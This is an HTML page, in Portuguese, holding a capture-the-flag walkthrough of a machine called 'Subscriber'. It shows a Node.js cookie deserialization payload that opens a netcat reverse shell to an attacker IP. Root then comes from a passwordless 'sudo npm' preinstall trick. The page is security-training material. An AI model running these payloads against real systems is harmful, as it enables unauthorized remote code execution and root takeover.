@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8" />
+    <link href="styles/style.css" rel="stylesheet" />
+    <title>Subscriber [HC] — dinvoke</title>
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
+    <link
+      href="https://fonts.googleapis.com/css?family=Playfair+Display+SC"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Linden+Hill"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Cormorant"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Cinzel"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <header class="page-header">
+      <h1 class="page-title"><a href="articles.html">Subscriber [HC]</a></h1>
+      <p class="page-sub">MMXXVI ✧ II</p>
+    </header>
+
+    <article class="article-page">
+      <p class="about-sub">✧ ✧ ✧</p>
+
+<p>A aplicação possui vulnerabilidades insecure deserialization permite execução remota de comandos, privilege escalation via sudo npm sem senha.</p>
+<p>Passando um nmap vemos que temos a porta 22, 80 e 3000.</p>
+<center><img src="images/subscriber1.png" alt="nmap" width="100%"></center>
+
+<p>Na porta 80 temos uma página em manutenção.</p>
+<center><img src="images/subscriber2.png" alt="port 80" width="100%"></center>
+
+<p>E na porta 3000 temos:</p>
+<center><img src="images/subscriber3.png" alt="port 3000" width="100%"></center>
+
+<p>Onde você manda um email e ele te retorna um cookie.</p>
+<center><img src="images/subscriber4.png" alt="email cookie" width="100%"></center>
+
+<p>Pegando esse cookie e vendo o conteúdo temos:</p>
+<center><img src="images/subscriber5.png" alt="cookie content" width="100%"></center>
+
+<p>O <code>userName</code> já definido por padrão, e o email com o nosso email passado. Então procurando algo sobre desserialização em node.js temos:</p>
+<p><a href="https://exploit-notes.hdks.org/exploit/web/nodejs-deserialization-attack/">Node.js Deserialization Attack — Exploit Notes</a></p>
+<center><img src="images/subscriber6.png" alt="exploit notes" width="100%"></center>
+
+<p>Onde gerou um payload serializado:</p>
+<pre><code class="language-json">{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function() {\n require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.63.242 8443 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout); });\n }&quot;}
+</code></pre>
+<p>Aperfeiçoando ele para a nossa situação temos:</p>
+<pre><code class="language-json">{&quot;userName&quot;:&quot;Anonymous&quot;,&quot;Email&quot;:&quot;_$$ND_FUNC$$_function() {\nrequire('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.11.123 4444 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout); });\n }()&quot;}
+</code></pre>
+<p>Então conseguimos subir uma shell:</p>
+<center><img src="images/subscriber7.png" alt="shell" width="100%"></center>
+
+<p>Dando um <code>sudo -l</code> vemos que temos permissões sudo no npm:</p>
+<center><img src="images/subscriber8.png" alt="sudo -l" width="100%"></center>
+
+<p>Procurando um pouco temos payloads já prontos no <a href="https://gtfobins.github.io/gtfobins/npm/">GTFOBins</a>:</p>
+<pre><code class="language-bash">TF=$(mktemp -d)
+echo '{&quot;scripts&quot;: {&quot;preinstall&quot;: &quot;/bin/sh&quot;}}' &gt; $TF/package.json
+sudo npm -C $TF --unsafe-perm i
+</code></pre>
+<center><img src="images/subscriber9.png" alt="root" width="100%"></center>
+
+<p>Daí conseguimos root.</p>
+
+      <a href="articles.html" class="about-back">✧ Return</a>
+    </article>
+  </body>
+</html>
